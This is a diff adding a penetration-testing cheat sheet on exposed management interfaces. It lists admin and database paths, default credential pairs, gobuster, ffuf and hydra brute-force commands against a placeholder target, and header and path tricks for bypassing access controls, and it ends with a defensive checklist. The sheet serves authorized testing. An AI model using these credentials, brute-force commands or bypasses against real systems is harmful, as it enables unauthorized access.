@@ -1,0 +1,294 @@
+# Insecure Management Interface
+
+## ========================================
+## COMMON ADMIN PATHS
+## ========================================
+
+/admin
+/admin/
+/administrator
+/administration
+/adminpanel
+/admin_area
+/admin-console
+/backend
+/manager
+/management
+/control-panel
+/controlpanel
+/cms
+/dashboard
+/wp-admin
+/cpanel
+/plesk
+/webadmin
+
+## ========================================
+## DATABASE MANAGEMENT
+## ========================================
+
+/phpmyadmin
+/phpMyAdmin
+/pma
+/myadmin
+/mysql
+/mysqladmin
+/db
+/database
+/dbadmin
+/adminer
+/adminer.php
+
+## ========================================
+## SERVER MANAGEMENT
+## ========================================
+
+/server-status
+/server-info
+/status
+/info.php
+/phpinfo.php
+/test.php
+/console
+/jmx-console
+/web-console
+/admin-console
+
+## ========================================
+## APPLICATION SERVERS
+## ========================================
+
+# Tomcat
+/manager/html
+/host-manager/html
+/admin/index.jsp
+
+# JBoss/WildFly
+/console
+/jmx-console
+/web-console
+/invoker/JMXInvokerServlet
+
+# Weblogic
+/console
+/consolehelp
+/wls-cat
+
+# Glassfish
+/admin
+/common/index.jsf
+
+## ========================================
+## FRAMEWORK SPECIFIC
+## ========================================
+
+# Spring Boot
+/actuator
+/actuator/health
+/actuator/env
+/actuator/metrics
+/actuator/mappings
+/actuator/dump
+/actuator/trace
+
+# Laravel
+/horizon
+/telescope
+/debug-bar
+
+# Django
+/admin
+/__debug__/
+
+# Rails
+/rails/info
+/rails/mailers
+
+## ========================================
+## MONITORING/METRICS
+## ========================================
+
+/metrics
+/health
+/healthcheck
+/status
+/ping
+/alive
+/ready
+/jolokia
+/hawtio
+/prometheus
+/grafana
+
+## ========================================
+## API MANAGEMENT
+## ========================================
+
+/api/docs
+/api/swagger
+/swagger
+/swagger-ui
+/swagger-ui.html
+/api-docs
+/openapi.json
+/graphql
+/graphiql
+
+## ========================================
+## DEFAULT CREDENTIALS
+## ========================================
+
+# Common combinations
+admin:admin
+admin:password
+administrator:administrator
+root:root
+root:password
+admin:admin123
+admin:1234
+tomcat:tomcat
+admin:
+sa:
+guest:guest
+
+## ========================================
+## CLOUD/CONTAINER
+## ========================================
+
+# Kubernetes
+/api/v1
+/apis
+/metrics
+
+# Docker
+:2375/containers/json
+:2376/containers/json
+
+# Consul
+:8500/ui
+
+# Elasticsearch
+:9200/_cluster/health
+
+## ========================================
+## NETWORK DEVICES
+## ========================================
+
+# Default paths
+/cgi-bin/
+/tmui/login.jsp (F5 BIG-IP)
+/remote/login (FortiGate)
+/vpns/portal (Palo Alto)
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Directory enumeration
+gobuster dir -u http://target.com -w admin-paths.txt
+
+# 2. Try default credentials
+# Use Hydra or manual testing
+
+# 3. Check for authentication bypass
+# SQL injection in login
+# Default accounts
+
+# 4. Test authorization
+# Access without authentication
+# Privilege escalation
+
+## ========================================
+## COMMON VULNERABILITIES
+## ========================================
+
+# No authentication required
+# Default credentials
+# Weak passwords
+# Accessible from internet
+# No IP restrictions
+# Information disclosure
+# CSRF on admin actions
+
+## ========================================
+## EXPLOITATION
+## ========================================
+
+# Access admin panel
+curl http://target.com/admin
+
+# Test default credentials
+curl -u admin:admin http://target.com/admin
+
+# Brute force
+hydra -l admin -P passwords.txt target.com http-get /admin
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Path traversal
+/admin/../admin/
+//admin
+/./admin
+/admin/./
+
+# Header manipulation
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+# HTTP method
+POST /admin instead of GET
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Gobuster
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# ffuf
+ffuf -u http://target.com/FUZZ -w admin-paths.txt
+
+# Dirsearch
+python3 dirsearch.py -u http://target.com
+
+# Nuclei
+nuclei -u http://target.com -t exposures/
+
+## ========================================
+## WORDLISTS
+## ========================================
+
+# SecLists
+Admin-Panels.txt
+Common-Admin-Panels.txt
+management-interface.txt
+
+## ========================================
+## CLOUD SPECIFIC
+## ========================================
+
+# AWS
+:8080/jenkins
+:9000/minio
+
+# Azure
+# Azure management endpoints
+
+# GCP
+# GCP management interfaces
+
+## ========================================
+## DEFENSE TESTING
+## ========================================
+
+# Verify:
+- Admin panels not publicly accessible
+- Strong authentication required
+- IP whitelisting in place
+- No default credentials
+- HTTPS enforced
+- Rate limiting enabled
+- Logging/monitoring active
